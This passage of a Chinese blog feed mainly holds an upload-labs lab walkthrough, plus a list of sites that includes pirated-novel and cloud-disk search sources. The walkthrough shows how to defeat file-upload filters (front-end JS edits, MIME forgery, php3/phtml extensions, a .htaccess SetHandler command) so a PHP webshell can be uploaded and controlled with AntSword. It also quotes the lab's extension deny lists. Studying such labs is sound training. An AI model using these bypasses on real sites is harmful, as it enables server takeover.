align="center">资源很多，但是有会员机制，大部分普通软件有百度云链接</td></tr><tr><td align="center"><a href="https://co6.cc/">Charm 城市女孩</a></td><td align="center"><code>Android</code> <code>Windows</code></td><td align="center">我更好奇站长到底是不是女孩</td></tr><tr><td align="center"><a href="https://www.cuiuc.com/">CUIUC</a></td><td align="center"><code>全平台</code></td><td align="center">更新较慢，软件种类很多</td></tr></tbody></table><hr><h3 id="免费小说"><a href="#免费小说" class="headerlink" title="免费小说"></a>免费小说</h3><blockquote><p><strong>加粗网站强烈推荐</strong><br>日常请阅读<strong>正版</strong>小说，支持正版人人有责</p></blockquote><p>小说也是盗版重灾区，不过我平时不怎么看网络小说，对这块不怎么熟，希望大家踊跃分享网站</p><p>一般的盗版小说网站广告都很多，其实更推荐一些手机 app，可以重新排版，去广告，可以添加多个书源，体验要好很多，比如<a href="https://www.coolapk.com/apk/cn.deepink.reader">厚墨</a>，iOS 可以使用<a href="https://itunes.apple.com/cn/app/id1137819437">爱阅书香</a></p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://www.x23qb.com/"><strong>铅笔小说</strong></a></td><td align="center">网文</td><td align="center"><code>无广告</code> <code>阅读体验好</code></td></tr><tr><td align="center"><a href="https://www.daocaorenshuwu.com/">稻草人书屋</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.wanbentxt.com/">完本神站</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.9txs.com/">九桃小说</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="http://www.quanben.io/">全本小说</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.shenzhankanshu.com/">看书神站</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.meiguixs.net/">玫瑰小说</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.wenxuemi6.com/">文学迷</a></td><td align="center">网文</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://book.crazyideal.com/">吾的轻小说</a></td><td align="center">轻小说</td><td align="center"><code>无广告</code></td></tr><tr><td align="center"><a href="https://www.qinxiaoshuo.com/">亲小说</a></td><td align="center">轻小说</td><td align="center"><code>无广告</code></td></tr></tbody></table><hr><h3 id="云盘搜索"><a href="#云盘搜索" class="headerlink" title="云盘搜索"></a>云盘搜索</h3><blockquote><p>请勿用来做非法用途<br>不更新此板块，失效请自行 Google</p></blockquote><p>现在的云盘搜索网站都搜不出什么好东西，实在垃圾，搜索到了下载还费劲，搞得我心力交瘁</p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://www.yunpanjingling.com/">云盘精灵</a></td><td align="center">百度云盘</td><td align="center"><code>资源质量高</code> <code>搜索结果多</code> <code>有 Chrome 扩展自动填写密码</code> <code>收费</code></td></tr><tr><td align="center"><a href="https://www.dalipan.com/">大力盘</a></td><td align="center">百度云盘</td><td align="center"></td></tr><tr><td align="center"><a href="https://www.xiaobaipan.com/">小白盘</a></td><td align="center">百度云盘</td><td align="center"></td></tr><tr><td align="center"><a href="https://www.xiaokesoso.com/">小可搜搜</a></td><td align="center">百度云盘</td><td align="center"></td></tr><tr><td align="center"><a href="https://www.ttyunsou.cn/">天天云搜</a></td><td align="center">百度云盘</td><td align="center"></td></tr><tr><td align="center"><a href="https://www.quzhuanpan.com/">去转盘</a></td><td align="center">百度云盘</td><td align="center"></td></tr></tbody></table><hr><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><blockquote><p>强烈抵制百度</p></blockquote><p>最好的搜索引擎肯定是 Google，当然由于网络原因，使用比较困难，不懂可以加群：172622261问群主</p><p>其实现在各种各样的搜索引擎层出不穷，百度早已不是唯一选择<br>必应，搜狗，神马就不提了，主要分享一些比较与众不同的</p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://mijisou.com/">秘迹搜索</a></td><td align="center">常规</td><td align="center"><code>不收集隐私</code> <code>汇聚了百度、必应等多个搜索结果</code> <code>剃除所有广告</code></td></tr><tr><td align="center"><a href="https://www.dogedoge.com/">多吉搜索</a></td><td align="center">常规</td><td align="center"><code>不追踪，不误导</code> <code>速度快</code> <code>搜索结果精准</code></td></tr><tr><td align="center"><a href="https://www.ecosia.org/">Ecosia</a></td><td align="center">常规</td><td align="center"><code>搜索结果来自微软</code></td></tr><tr><td align="center"><a href="https://goobe.io/">Goobe</a></td><td align="center">程序相关</td><td align="center"><code>堪比 Google</code></td></tr><tr><td align="center"><a href="https://s.geekbang.org/">极客搜索</a></td><td align="center">技术文章</td><td align="center"><code>搜索结果来自 InfoQ 的媒体矩阵，质量不错</code></td></tr><tr><td align="center"><a href="https://magi.com/"><strong>Magi</strong></a></td><td align="center">AI 知识引擎</td><td align="center"><code>用 AI 梳理互联网的知识引擎</code> <code>搜索结果异常精准</code> <code>目前还不太成熟</code></td></tr><tr><td align="center"><a href="https://www.wolframalpha.com/"><strong>WolframAlpha</strong></a></td><td align="center">AI 知识引擎</td><td align="center"><code>擅长计算，比如高数，物理</code> <code>AI 知识引擎</code></td></tr><tr><td align="center"><a href="https://www.tuoniaofabu.com/">鸵鸟搜索</a></td><td align="center">磁力链</td><td align="center"><code>开源</code> <code>无广告</code> <code>集成多个磁力搜索网站</code></td></tr><tr><td align="center"><a href="https://www.jiumodiary.com/">鸠摩搜书</a></td><td align="center">图书</td><td align="center"><code>搜索结果多</code></td></tr><tr><td align="center"><a href="https://tineye.com/">TinEye</a></td><td align="center">以图搜图</td><td align="center"><code>搜索结果多</code> <code>速度不算快</code></td></tr><tr><td align="center"><a href="https://trace.moe/">trace.moe</a></td><td align="center">以图搜动画</td><td align="center"><code>开源动画搜索引擎</code> <code>结果精确</code></td></tr><tr><td align="center"><a href="https://www.likefont.com/">识字体网</a></td><td align="center">以图搜字体</td><td align="center"><code>上传图片识别字体</code> <code>结果精确</code></td></tr><tr><td align="center"><a href="http://www.quodb.com/">QuoDB</a></td><td align="center">以台词搜电影</td><td align="center"><code>英文</code> <code>根据台词搜索电影</code> <code>结果精确</code></td></tr><tr><td align="center"><a href="http://www.subzin.com/">Subzin</a></td><td align="center">以台词搜电影</td><td align="center"><code>英文</code> <code>根据台词搜索电影</code> <code>结果精确</code></td></tr></tbody></table><h3 id="欢迎在下方留言补充更多网站"><a href="#欢迎在下方留言补充更多网站" class="headerlink" title="欢迎在下方留言补充更多网站"></a><span id="website">欢迎在下方留言补充更多网站</span></h3>]]></content>
      
      
      <categories>
          
          <category> 收集的一些网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 好东西 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 导航 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传木马制作</title>
      <link href="2020/11/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/"/>
      <url>2020/11/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传木马制作"><a href="#文件上传木马制作" class="headerlink" title="文件上传木马制作"></a>文件上传木马制作</h1><blockquote><blockquote><blockquote><blockquote><p>测试</p></blockquote></blockquote></blockquote></blockquote><div id="binft"></div>  <script>    var binft = function (r) {      function t() {        return b[Math.floor(Math.random() * b.length)]      }        function e() {        return String.fromCharCode(94 * Math.random() + 33)      }      function n(r) {        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {          var l = document.createElement("span");          l.textContent = e(), l.style.color = t(), n.appendChild(l)        }        return n      }      function i() {        var t = o[c.skillI];        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)      }      var l = "",      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {      return r + ""      }),      a = 2,      g = 1,      s = 5,      d = 75,      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],      c = {        text: "",        prefixP: -s,        skillI: 0,        skillP: 0,        direction: "forward",        delay: a,        step: g      };      i()      };      binft(document.getElementById('binft'));  </script>  [我想跳转](#饼图（Pie）)<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token url">[<span class="token content">我想跳转</span>](#饼图)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="#jump">点击跳转</a></p><h2 id="跳转到的地方"><a href="#跳转到的地方" class="headerlink" title="跳转到的地方"></a><span id="jump">跳转到的地方</span></h2>]]></content>
      
      
      <categories>
          
          <category> 文件上传木马制作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="2020/11/16/upload-labs/"/>
      <url>2020/11/16/upload-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>文件上传靶机ak,好耶</p><a id="more"></a><h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>upload-labs源码地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p><strong>补充：火狐抓本地包要把这里改成true</strong></p><p><img src="/2020/11/16/upload-labs/image-20201119001913168.png" alt="image-20201119001913168" loading="lazy"></p><p><img src="/2020/11/16/upload-labs/mind-map.png" alt="img" loading="lazy"></p><h2 id="Pass-1-js检查"><a href="#Pass-1-js检查" class="headerlink" title="Pass-1-js检查"></a>Pass-1-js检查</h2><p>提示说是前端JS检查，有很多种方法</p><p>我列举几种</p><p><strong>方法一：</strong></p><p><img src="/2020/11/16/upload-labs/image-20201116230844842.png" alt="image-20201116230844842" loading="lazy"></p><p>直接改前端源码，加上.php即可上传</p><p><strong>方法二：</strong></p><p>把php文件后缀改成jpg,png,gif中的一种，再burp抓包修改后缀</p><p><img src="/2020/11/16/upload-labs/image-20201116231814067.png" alt="image-20201116231814067" loading="lazy"></p><p>jpg改成php再放包即可</p><p>PHP一句话木马文件上传后就蚁剑直连即可</p><p><img src="/2020/11/16/upload-labs/image-20201116232130408.png" alt="image-20201116232130408" loading="lazy"></p><p><img src="/2020/11/16/upload-labs/image-20201116232228381.png" alt="image-20201116232228381" loading="lazy"></p><h2 id="Pass-2-MIME-Type"><a href="#Pass-2-MIME-Type" class="headerlink" title="Pass-2-MIME-Type"></a>Pass-2-MIME-Type</h2><p>查看提示，本pass在服务端对数据包的MIME进行检查！</p><p>MIME-Type介绍：</p><p>MIME(Multipurpose Internet Mail  Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><p>仅仅判断content-type类型，因此上传easy.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p><p><img src="/2020/11/16/upload-labs/image-20201117155401149.png" alt="image-20201117155401149" loading="lazy"></p><p>即可上传成功</p><h2 id="Pass-3-黑名单绕过"><a href="#Pass-3-黑名单绕过" class="headerlink" title="Pass-3-黑名单绕过"></a>Pass-3-黑名单绕过</h2><p>上传php的时候有个很明显的黑名单限制提示，尝试使用<strong>php3,phtml</strong>等绕过</p><p><img src="/2020/11/16/upload-labs/image-20201117170736240.png" alt="image-20201117170736240" loading="lazy"></p><p>成功上传</p><h2 id="Pass-4-htaccess绕过"><a href="#Pass-4-htaccess绕过" class="headerlink" title="Pass-4-.htaccess绕过"></a>Pass-4-.htaccess绕过</h2><p>不能上传php，但能上传php.jpg,php.asd，说明是黑名单限制，但是<strong>php3,phtml</strong>都被限制了</p><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pHp1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>几乎所有可以绕过的后缀名都被限制了，但是唯独没有**.htaccess**，可以先上传一个.htaccess让所有文件解析为php，然后再上传一个图片马</p><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p><strong>.htaccess文件创建</strong></p><p>由于直接创建txt文档会显示必须键入文件名，所以可以采用cmd命令方式生成</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">echo SetHandler application&#x2F;x-httpd-php  &gt; .htaccess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/16/upload-labs/image-20201117172111304.png" alt="image-20201117172111304" loading="lazy"></p><p>上传.htaccess文件再上传一个图片马即可，也可以上传写有木马的txt文件，txt文件也可被解析。</p><h2 id="Pass-5-大小写绕过"><a href="#Pass-5-大小写绕过" class="headerlink" title="Pass-5-大小写绕过"></a>Pass-5-大小写绕过</h2><p>不能上传php，**.htaccess**但能上传php.jpg,php.asd，说明是黑名单限制</p><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token 